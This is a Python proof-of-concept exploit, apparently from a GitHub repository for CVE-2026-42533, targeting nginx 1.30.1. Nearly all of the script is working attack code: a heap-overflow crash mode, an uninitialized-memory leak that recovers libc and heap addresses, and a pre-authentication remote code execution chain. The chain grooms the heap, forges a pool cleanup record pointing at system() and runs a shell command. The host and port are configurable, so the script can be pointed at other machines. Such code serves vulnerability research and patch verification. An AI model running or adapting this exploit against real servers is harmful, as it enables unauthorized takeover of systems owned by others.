# https://github.com/0xCyberstan/CVE-2026-42533-POC/tree/main

#!/usr/bin/env python3
import argparse
import os
import socket
import struct
import sys
import time

HOST = "127.0.0.1"
PORT = 8950

LIBC_LEAK_OFFSET = 0x2041C0
SYSTEM_OFFSET = 0x58750
BODY_DELTA_ASLR_OFF = 0x6A708
BODY_DELTA_ASLR_ON = 0x6A578
POOL_OFF_FROM_BUF = 0x108
D_LAST_OFF = 0x180
D_END_OFF = 0x200
LOG_OFF = 0x60
BODY_LEN = 200
PAD_HEADERS = 18
N_VICTIMS = 40
HOLE_IDX = 20
TARGET_IDX = 21

# --rce-det (needs nginx_det.conf): the leaked heap pointer sits somewhere in the
# heap's 0x22xxx page, so heap_base = (leaked_ptr & ~0xfff) - 0x22000. PL_OFF is
# where a held partial POST /b/ body lands; the payload is one forged cleanup there.
# PL_OFF is build/config-specific; run calibrate.py to read it off a live worker.
HEAP_PAGE_OFF = 0x22000
PL_OFF = 0x14426
PL_LEN = 3072
PL_HOLDERS = 12


def p64(v):
    return struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)


def u64(b):
    return struct.unpack("<Q", b[:8])[0]


def do_leak():
    uri_pad = b"A" * 8160
    req = (
        b"GET /l2/"
        + uri_pad
        + b" HTTP/1.1\r\nHost: x\r\nX-Lk: X\r\nConnection: close\r\n\r\n"
    )
    try:
        s = socket.create_connection((HOST, PORT), timeout=5)
        s.sendall(req)
        s.settimeout(5)
        resp = b""
        while True:
            chunk = s.recv(65536)
            if not chunk:
                break
            resp += chunk
        s.close()
    except Exception:
        return None, None, None
    hdr_end = resp.find(b"\r\n\r\n")
    if hdr_end < 0:
        return None, None, None
    body = resp[hdr_end + 4 :]
    if len(body) < 0x20:
        return None, None, None
    return body, u64(body[0x08:0x10]), u64(body[0x10:0x18])


def has_bad_bytes(libc_base, heap_ptr, body_delta):
    body_addr = heap_ptr + body_delta
    pool_addr = body_addr + POOL_OFF_FROM_BUF
    for val in [
        libc_base + SYSTEM_OFFSET,
        body_addr,
        body_addr + 24,
        pool_addr + D_LAST_OFF,
        pool_addr + D_END_OFF,
        pool_addr,
        pool_addr + LOG_OFF,
        body_addr + 136,
    ]:
        if b"\x0a" in p64(val):
            return True
    return False


def open_victim():
    s = socket.create_connection((HOST, PORT), timeout=30)
    s.sendall(b"GET /static/a.txt HTTP/1.1\r\nHost: x\r\nX-V: " + b"V" * 50 + b"\r\n")
    return s


def close_victim(s):
    try:
        s.shutdown(socket.SHUT_RDWR)
    except:
        pass
    try:
        s.close()
    except:
        pass


def build_body(libc_base, heap_ptr, body_delta, cmd, cleanup_ptr=None):
    # cleanup_ptr, if set, replaces the planted pool->cleanup value (--rce-det
    # aims it at the held forged cleanup instead of the transient body).
    body_addr = heap_ptr + body_delta
    pool_addr = body_addr + POOL_OFF_FROM_BUF
    system_addr = libc_base + SYSTEM_OFFSET
    cmd_addr = body_addr + 24
    body = bytearray(BODY_LEN)
    body[0:8] = p64(system_addr)
    body[8:16] = p64(cmd_addr)
    body[16:24] = p64(0)
    assert len(cmd) <= 15
    body[24 : 24 + len(cmd)] = cmd
    body[24 + len(cmd)] = 0
    body[40:48] = p64(0x1010)
    body[48:56] = p64(0x211)
    body[56:64] = p64(pool_addr + D_LAST_OFF)
    body[64:72] = p64(pool_addr + D_END_OFF)
    body[72:80] = p64(0)
    body[80:88] = p64(0)
    body[88:96] = p64(D_END_OFF - 80)
    body[96:104] = p64(pool_addr)
    body[104:112] = p64(0)
    body[112:120] = p64(0)
    body[120:128] = p64(cleanup_ptr if cleanup_ptr is not None else body_addr)
    body[128:136] = p64(pool_addr + LOG_OFF)
    body[136:152] = b"\x00" * 16
    body[152:160] = p64(0)
    body[160:168] = p64(0)
    body[168:176] = p64(0)
    body[176:184] = p64(0)
    body[184:192] = p64(0)
    body[192:200] = p64(body_addr + 136)
    if b"\x0a" in bytes(body):
        raise ValueError("body contains 0x0a at offset %d" % bytes(body).index(b"\x0a"))
    return bytes(body)


def fire_trigger(body):
    pad = b"".join(b"X-Pad-%02d: %s\r\n" % (i, b"Q" * 64) for i in range(PAD_HEADERS))
    req = (
        b"POST /b/abc HTTP/1.1\r\nHost: x\r\n"
        + pad
        + b"Content-Type: application/octet-stream\r\n"
        b"Content-Length: " + str(len(body)).encode() + b"\r\n"
        b"Connection: close\r\n\r\n" + body
    )
    s = socket.create_connection((HOST, PORT), timeout=10)
    s.sendall(req)
    return s


def warmup(n=30):
    for _ in range(n):
        try:
            s = socket.create_connection((HOST, PORT), timeout=1)
            s.sendall(b"GET / HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
            s.settimeout(1)
            s.recv(4096)
            s.close()
        except:
            pass


def forge_cleanup(system_addr, at, cmd):
    # one ngx_pool_cleanup_t {handler=system, data=&cmd, next=0}, cmd inline at +24
    return (p64(system_addr) + p64(at + 24) + p64(0) + cmd + b"\x00").ljust(
        PL_LEN, b"\x00"
    )


def spray_payload(payload, n=PL_HOLDERS):
    # hold it in partial POST /b/ bodies; nginx buffers them (any bytes allowed)
    socks = []
    for _ in range(n):
        try:
            s = socket.create_connection((HOST, PORT), timeout=3)
            s.sendall(
                b"POST /b/zz HTTP/1.1\r\nHost: x\r\nContent-Length: 4096\r\n\r\n"
                + payload
            )
            socks.append(s)
            time.sleep(0.003)
        except OSError:
            pass
    return socks


def mode_crash():
    body = b"A" * BODY_LEN
    pad = b"".join(b"X-Pad-%02d: %s\r\n" % (i, b"Q" * 64) for i in range(PAD_HEADERS))
    req = (
        b"POST /b/abc HTTP/1.1\r\nHost: localhost\r\n"
        + pad
        + b"Content-Type: application/octet-stream\r\n"
        b"Content-Length: " + str(BODY_LEN).encode() + b"\r\n"
        b"Connection: close\r\n\r\n" + body
    )
    print("[*] Sending POST /b/abc with %d-byte body" % BODY_LEN)
    print("[*] LEN=211, VALUE=408, overflow=197 bytes")
    try:
        with socket.create_connection((HOST, PORT), timeout=10) as s:
            try:
                s.sendall(req)
                s.settimeout(5)
                resp = s.recv(4096)
                print("[*] Got response (%d bytes)" % len(resp))
            except socket.timeout:
                print("[*] Timeout (expected with unreachable proxy_pass)")
            except (ConnectionResetError, BrokenPipeError):
                print("[*] Trigger connection reset (possible worker crash)")
    except ConnectionRefusedError:
        print("[!] Connection refused - is nginx running on port %d?" % PORT)
        return 1
    except OSError as exc:
        print("[!] Trigger connection failed: %s" % exc)
        return 1
    time.sleep(1)
    try:
        s = socket.create_connection((HOST, PORT), timeout=2)
        s.sendall(b"GET / HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
        s.settimeout(2)
        data = s.recv(4096)
        s.close()
        if b"alive" in data or b"200" in data:
            print("[*] Worker still alive (use ASan build to confirm overflow)")
        else:
            print("[*] Worker responded but unexpected content")
    except:
        print("[!] Worker crashed or unresponsive after overflow")
    return 0


def mode_leak():
    print("[*] Sending GET /l2/%s... (8160 bytes)" % ("A" * 20))
    body_data, libc_ptr, heap_ptr = do_leak()
    if body_data is None:
        print("[!] Leak failed")
        return 1
    print("[+] Response body: %d bytes" % len(body_data))
    print("[+] First 2 bytes (initialized): %r" % body_data[:2])
    print("[+] Remaining %d bytes: uninitialized heap content" % (len(body_data) - 2))
    print()
    print("[+] Pointer scan:")
    for off in range(0, min(0x40, len(body_data)), 8):
        val = u64(body_data[off : off + 8])
        tag = ""
        if 0x7F0000000000 <= val < 0x800000000000:
            tag = " <-- libc/ld region"
        elif 0x500000000000 <= val < 0x700000000000:
            tag = " <-- heap region"
        print("    [0x%02x] = 0x%016x%s" % (off, val, tag))
    if 0x7F0000000000 <= libc_ptr < 0x800000000000:
        libc_base = libc_ptr - LIBC_LEAK_OFFSET
        print("\n[+] libc pointer: 0x%x" % libc_ptr)
        print(
            "[+] libc base:    0x%x (page-aligned: %s)"
            % (libc_base, libc_base & 0xFFF == 0)
        )
    if 0x500000000000 <= heap_ptr < 0x700000000000:
        print("[+] heap pointer: 0x%x" % heap_ptr)
    return 0


def mode_rce(aslr_off):
    cmd = b"id>/tmp/PWNED"
    marker = "/tmp/PWNED"
    body_delta = BODY_DELTA_ASLR_OFF if aslr_off else BODY_DELTA_ASLR_ON
    try:
        os.unlink(marker)
    except:
        pass

    print("[*] nginx 1.30.1 pre-auth RCE")
    print("[*] Mode: %s" % ("ASLR-off" if aslr_off else "ASLR-on"))
    print("[*] Target: %s:%d" % (HOST, PORT))
    print("[*] Command: %s" % cmd.decode())
    print()

    print("[+] Warmup + info leak...")
    warmup(30)
    time.sleep(0.1)
    libc_base = heap_ptr = None
    for attempt in range(20):
        body_data, libc_ptr, heap_raw = do_leak()
        if body_data is None:
            time.sleep(0.1)
            continue
        if not (0x100000000000 < libc_ptr < 0x800000000000):
            time.sleep(0.1)
            continue
        base = libc_ptr - LIBC_LEAK_OFFSET
        if base & 0xFFF:
            time.sleep(0.1)
            continue
        if not (0x100000000000 < heap_raw < 0x800000000000):
            time.sleep(0.1)
            continue
        if has_bad_bytes(base, heap_raw, body_delta):
            print("    attempt %d: 0x0a in address, retrying" % (attempt + 1))
            time.sleep(0.1)
            continue
        libc_base, heap_ptr = base, heap_raw
        break

    if not libc_base:
        print("[!] Info leak failed after 20 attempts")
        return 1

    body_addr = heap_ptr + body_delta
    print("    libc_base = 0x%x" % libc_base)
    print("    heap_ptr  = 0x%x" % heap_ptr)
    print("    system()  = 0x%x" % (libc_base + SYSTEM_OFFSET))
    print("    body_addr = 0x%x" % body_addr)

    print("\n[+] Spraying %d connections..." % N_VICTIMS)
    victims = []
    for i in range(N_VICTIMS):
        try:
            victims.append(open_victim())
        except Exception as e:
            print("    victim %d failed: %s" % (i, e))
            break
    print("    %d open" % len(victims))
    time.sleep(0.2)
    if len(victims) < TARGET_IDX + 1:
        print("[!] Not enough spray connections")
        for v in victims:
            close_victim(v)
        return 1

    print("\n[+] Freeing hole at index %d..." % HOLE_IDX)
    close_victim(victims[HOLE_IDX])
    victims[HOLE_IDX] = None
    time.sleep(0.3)

    print("\n[+] Triggering overflow...")
    body = build_body(libc_base, heap_ptr, body_delta, cmd)
    trigger_sock = fire_trigger(body)
    time.sleep(0.5)

    print("\n[+] Detonating (closing victim[%d])..." % TARGET_IDX)
    close_victim(victims[TARGET_IDX])
    victims[TARGET_IDX] = None
    time.sleep(1.0)

    if os.path.exists(marker):
        print("\n[!!!] RCE CONFIRMED -- %s created" % marker)
        with open(marker) as f:
            print("[!!!] Content: %s" % f.read().strip())
        try:
            trigger_sock.close()
        except:
            pass
        for v in victims:
            if v:
                close_victim(v)
        return 0

    try:
        trigger_sock.close()
    except:
        pass
    for v in victims:
        if v:
            close_victim(v)
    time.sleep(0.5)
    if os.path.exists(marker):
        print("\n[!!!] RCE CONFIRMED (delayed) -- %s created" % marker)
        return 0

    print(
        "\n[*] No RCE this attempt. Heap layout likely didn't match expected offsets."
    )
    return 2


def mode_rce_det():
    # deterministic: absolute heap base from the formula, one forged cleanup held
    # in a POST /b/ body at a known address, overflow cleanup pointed at it.
    marker = "/tmp/PWNED"
    cmd = b"id>/tmp/PWNED"
    try:
        os.unlink(marker)
    except:
        pass

    print("[*] nginx 1.30.1 pre-auth RCE (deterministic)")
    print("[*] Target: %s:%d" % (HOST, PORT))
    print()

    print("[+] Warmup + info leak...")
    warmup(30)
    time.sleep(0.1)
    libc_base = heap_ptr = None
    for _ in range(20):
        body_data, libc_ptr, heap_raw = do_leak()
        if body_data is None:
            time.sleep(0.05)
            continue
        if not (0x100000000000 < libc_ptr < 0x800000000000):
            continue
        if (libc_ptr - LIBC_LEAK_OFFSET) & 0xFFF:
            continue
        if not (0x100000000000 < heap_raw < 0x800000000000):
            continue
        libc_base, heap_ptr = libc_ptr - LIBC_LEAK_OFFSET, heap_raw
        break
    if libc_base is None:
        print("[!] Info leak failed")
        return 1

    heap_base = (heap_ptr & ~0xFFF) - HEAP_PAGE_OFF
    system_addr = libc_base + SYSTEM_OFFSET
    at = heap_base + PL_OFF
    print("    libc_base = 0x%x" % libc_base)
    print("    heap_base = 0x%x" % heap_base)
    print("    system()  = 0x%x" % system_addr)
    print("    payload @ = 0x%x" % at)
    if b"\x0a" in p64(at):
        print("[!] payload address has 0x0a (regex-hostile); unlucky ASLR draw, retry")
        return 3

    print("\n[+] Placing forged cleanup at 0x%x..." % at)
    holders = spray_payload(forge_cleanup(system_addr, at, cmd))
    time.sleep(0.1)

    print("[+] Spraying %d victims, freeing hole at %d..." % (N_VICTIMS, HOLE_IDX))
    victims = [open_victim() for _ in range(N_VICTIMS)]
    time.sleep(0.2)
    if len([v for v in victims if v]) < TARGET_IDX + 1:
        print("[!] not enough victims")
        for v in victims + holders:
            close_victim(v)
        return 1
    close_victim(victims[HOLE_IDX])
    victims[HOLE_IDX] = None
    time.sleep(0.3)

    print("[+] Triggering overflow (pool cleanup -> forged cleanup)...")
    try:
        body = build_body(libc_base, heap_ptr, BODY_DELTA_ASLR_ON, b"x", cleanup_ptr=at)
    except ValueError:
        print("[!] overflow body has 0x0a; unlucky ASLR draw, retry")
        for v in victims + holders:
            close_victim(v)
        return 3
    trigger_sock = fire_trigger(body)
    time.sleep(0.5)
    close_victim(victims[TARGET_IDX])
    victims[TARGET_IDX] = None
    time.sleep(1.0)

    won = os.path.exists(marker)
    try:
        trigger_sock.close()
    except:
        pass
    for v in victims + holders:
        if v:
            close_victim(v)
    if won:
        print("\n[!!!] RCE CONFIRMED -- %s created" % marker)
        with open(marker) as f:
            print("[!!!] Content: %s" % f.read().strip())
        return 0
    print("\n[*] No RCE. Recalibrate PL_OFF/HEAP_PAGE_OFF for this build.")
    return 2


if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("--crash", action="store_true", help="heap overflow crash PoC")
    p.add_argument(
        "--leak", action="store_true", help="info leak PoC (dump heap pointers)"
    )
    p.add_argument(
        "--rce",
        action="store_true",
        help="full RCE chain (general config, single-shot ~66%%)",
    )
    p.add_argument(
        "--rce-det",
        action="store_true",
        help="deterministic RCE (needs nginx_det.conf)",
    )
    p.add_argument(
        "--aslr-off",
        action="store_true",
        help="use ASLR-off heap delta (for setarch -R)",
    )
    p.add_argument("--host", default=HOST)
    p.add_argument("--port", type=int, default=PORT)
    args = p.parse_args()
    HOST, PORT = args.host, args.port
    if args.crash:
        sys.exit(mode_crash())
    elif args.leak:
        sys.exit(mode_leak())
    elif args.rce:
        sys.exit(mode_rce(args.aslr_off))
    elif args.rce_det:
        sys.exit(mode_rce_det())
    else:
        p.print_help()
        sys.exit(1)
